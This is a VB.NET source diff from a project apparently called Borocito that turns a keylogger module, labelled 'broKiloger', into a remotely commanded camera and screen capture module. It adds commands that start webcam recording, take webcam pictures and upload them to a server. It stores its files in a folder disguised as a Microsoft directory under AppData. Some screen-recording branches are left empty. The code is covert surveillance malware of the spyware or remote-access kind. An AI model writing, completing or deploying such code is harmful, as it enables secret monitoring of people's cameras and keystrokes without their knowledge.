@@ -3,7 +3,6 @@ Module GlobalUses
     Public parameters As String
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
     Public HttpOwnerServer As String
-    Public alphabet As New ArrayList
 End Module
 Module Utility
     Public tlmContent As String
@@ -24,30 +23,10 @@ Module Utility
                 My.Computer.FileSystem.WriteAllText(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
             Catch
             End Try
-            BoroHearInterop(My.Application.Info.AssemblyName & "[" & from & "]" & content)
         Catch ex As Exception
             Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
         End Try
     End Sub
-
-    Function BoroHearInterop(Optional ByVal content As String = Nothing) As Boolean
-        Try
-            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-hear", True)
-            If regKey Is Nothing Then
-                Return False
-            Else
-                Try
-                    Process.Start(regKey.GetValue("boro-hear"), content)
-                    Return True
-                Catch
-                    Return False
-                End Try
-            End If
-        Catch ex As Exception
-            Console.WriteLine("[BoroHearInterop@Utility]Error: " & ex.Message)
-            Return False
-        End Try
-    End Function
 End Module
 Module Memory
     Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
@@ -75,58 +54,57 @@ Module Memory
 End Module
 Module StartUp
     Sub Init()
-        AddToLog("Init", "broKiloger " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
+        AddToLog("Init", My.Application.Info.AssemblyName & " " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
         Try
             'Cargamos los datos del registro de Windows
             LoadRegedit()
-            'Cargamos el alfabeto y numeros
-            ApplyAlphabet()
         Catch ex As Exception
             AddToLog("Init@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
-    Sub ApplyAlphabet()
-        Try
-            alphabet.Clear()
-            For Each item As Char In "abcdefghijklmnñopqrstuvwxyzABCDEFGHIJKLMNÑOPQRSTUVWXYZ1234567890"
-                alphabet.Add(item)
-            Next
-        Catch ex As Exception
-            AddToLog("ApplyAlphabet@StartUp", "Error: " & ex.Message, True)
-        End Try
-    End Sub
+
     Sub ReadParameters(ByVal parametros As String)
         Try
             If parametros <> Nothing Then
                 Dim parameter As String = parametros
-                If parameter.ToLower Like "*/startrecording*" Then
-                    'Comienza a registrar teclas
-                    Main.StartRecording()
+                If parameter.ToLower Like "*/startscreenrecording*" Then
+                    'Comienza a grabar la pantalla
 
-                ElseIf parameter.ToLower Like "*/stoprecording*" Then
-                    'Detiene el registrador de teclas
-                    Main.StopRecording()
 
-                ElseIf parameter.ToLower Like "*/sendrecord*" Then
-                    'envia el registro de teclas
-                    Main.SendRecord()
+                ElseIf parameter.ToLower Like "*/stopscreenrecording*" Then
+                    'Detiene la grabacion de pantalla
 
-                ElseIf parameter.ToLower Like "*/resetrecord*" Then
-                    'limpia el registro de teclas
-                    Main.ResetRecord()
 
-                ElseIf parameter.ToLower Like "*/sendandexit*" Then
-                    'envia el registro de teclas y luego cierra
-                    Main.SendRecord()
-                    Main.StopRecording()
+                ElseIf parameter.ToLower Like "*/startcamrecording*" Then
+                    'Comienza a grabar la camara
+                    Main.OpenPreviewWindow()
+                    Main.StartCamRecord()
 
-                Else
-                    'Comienza a registrar teclas
-                    Main.StartRecording()
+                ElseIf parameter.ToLower Like "*/takecampicture*" Then
+                    'Toma una captura de la camara y la envia
+                    Main.OpenPreviewWindow()
+                    Main.UploadFileToServer(Main.TakeCamPicture)
+
+                ElseIf parameter.ToLower Like "*/stopcamrecording*" Then
+                    'Detiene la grabacion de la camara
+                    Main.StopCamRecord()
+
+                ElseIf parameter.ToLower Like "*/sendscreenrecord*" Then
+                    'Detiene y luego envia la grabacion de pantalla
+
+
+                ElseIf parameter.ToLower Like "*/sendcamrecord*" Then
+                    'Detiene y luego envia la grabacion de la camara
+                    Main.UploadFileToServer(Main.StopCamRecord())
+
+                ElseIf parameter.ToLower Like "*/stop*" Then
+                    'Detiene todo y se cierra
+                    End
+
                 End If
             End If
         Catch ex As Exception
-            AddToLog("ReadParameters@StartUp", "Error: " & ex.Message, True)
+            AddToLog("ReadParameters@Main", "Error: " & ex.Message, True)
         End Try
     End Sub
 End Module
